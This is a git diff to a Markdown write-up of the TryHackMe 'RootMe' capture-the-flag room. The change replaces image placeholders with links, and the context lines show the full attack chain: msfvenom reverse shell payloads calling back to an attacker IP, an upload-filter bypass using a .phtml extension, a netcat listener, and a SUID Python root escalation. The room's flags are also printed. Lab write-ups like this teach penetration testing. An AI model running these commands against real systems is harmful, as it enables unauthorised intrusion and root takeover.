@@ -24,7 +24,7 @@ This guide contains the answer and steps necessary to get to them for the [RootM
    nmap -sV -sS 10.10.77.33 -p-     
    ```
 
-   RECON NMAP
+   ![Recon Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Recon_Nmap.png)
 
    ><details><summary>Click for answer</summary>2</details>
 
@@ -50,7 +50,7 @@ This guide contains the answer and steps necessary to get to them for the [RootM
    gobuster dir -u 10.10.77.33:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    ```
 
-   RECON DIRECTORY
+   ![Recon Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Recon_Directory.png)
 
    One of these is not a standard folder for a webserver.
 
@@ -66,11 +66,11 @@ This guide contains the answer and steps necessary to get to them for the [RootM
    msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=10.10.82.70 LPORT=1337 -f elf -o letmein.elf
    ```
 
-   SHELL PAYLOAD
+   ![Shell Payload](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Shell_Payload.png)
 
    This can now be uploaded to the webserver.
 
-   SHELL UPLOAD
+   ![Shell Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Shell_Upload.png)
 
    Unfortunately, I did not get a connection as the files was simply downloaded. We need to try a different format. Php is another usefull format for a reverse shell.
 
@@ -78,9 +78,9 @@ This guide contains the answer and steps necessary to get to them for the [RootM
    msfvenom -p php/reverse_php LHOST=10.10.82.70 LPORT=1337 -f raw > letmein.php
    ```
 
-   SHELL PAYLOAD PHP
+   ![Shell Payload Php](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Shell_Payload_Php.png)
 
-   SHELL UPLOAD PHP FAIL
+   ![Shell Upload Php Fail](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Shell_Upload_Php_Fail.png)
 
    The server doesn't let us upload a `.php` file. This might be bypassed by renaming the file extension. Simply renaming to `.jpg.php` did not work in this case, but `.phtml` did.
 
@@ -88,9 +88,9 @@ This guide contains the answer and steps necessary to get to them for the [RootM
    mv letmein.php letmein.phtml 
    ```
 
-   SHELL UPLOAD PHP RENAME
+   ![Shell Upload Php Rename](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Shell_Upload_Php_Rename.png)
 
-   SHELL UPLOAD PHP SUCCESS
+   ![Shell Upload Php Success](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Shell_Upload_Php_Success.png)
 
    Now that it is uploaded we start our listener again and click on the file we uploaded in the `/uploads/` directory.
 
@@ -98,19 +98,19 @@ This guide contains the answer and steps necessary to get to them for the [RootM
    nc -nlvp 1337
    ```
 
-   SHELL DIRECTORY
+   ![Shell Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Shell_Directory.png)
 
    Although the shell is connecting to our machine, it never seems to be fully established. So another method is in order. A pre-made php reverse shell can be obtained from 'pentestmonkey' on [github](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
 
-   SHELL PHP SCRIPT
+   ![Shell Php Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Shell_Php_Script.png)
 
    We only need to add our own IP and port to listen on.
 
-   SHELL PHP SCRIPT EDIT
+   ![Shell Php Script Edit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Shell_Php_Script_Edit.png)
 
    Save this file with the `phtml` extension en upload to the server. Setup the listener on port 1337 and execute the file from the `/uploads` page.
 
-   SHELL CONNECTION
+   ![Shell Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Shell_Connection.png)
 
    Success!
 
@@ -120,7 +120,7 @@ This guide contains the answer and steps necessary to get to them for the [RootM
    find / -name user.txt 2>/dev/null
    ```
 
-   SHELL FLAG
+   ![Shell Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Shell_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{y0u_g0t_a_sh3ll}</details>
 
@@ -130,7 +130,7 @@ This guide contains the answer and steps necessary to get to them for the [RootM
 
    Using: `find / -perm -4000 2>/dev/null` we can search for any binaries with their SUID bit set.
 
-   PRIV SUID
+   ![Priv SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Priv_SUID.png)
 
    ><details><summary>Click for answer</summary>/usr/bin/python</details>
 
@@ -140,7 +140,7 @@ This guide contains the answer and steps necessary to get to them for the [RootM
 
    After we identify the outlier, we can go to the GTFO bins website to find out how we can abuse this specific binary.
 
-   PRIV GTFO
+   ![Priv Gtfo](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Priv_Gtfo.png)
 
    We need to add the path to the python binary on this machine to the command. Then we can simply run it in our shell.
 
@@ -148,7 +148,7 @@ This guide contains the answer and steps necessary to get to them for the [RootM
    /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    ```
 
-   PRIV ESCALATION
+   ![Priv Escalation](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Priv_Escalation.png)
 
    We got root access!
 
@@ -158,6 +158,6 @@ This guide contains the answer and steps necessary to get to them for the [RootM
    find /root -name root.txt 2>/dev/null
    ```
 
-   PRIV ROOT FLAG
+   ![Priv Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Priv_Root_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{pr1v1l3g3_3sc4l4t10n}</details>
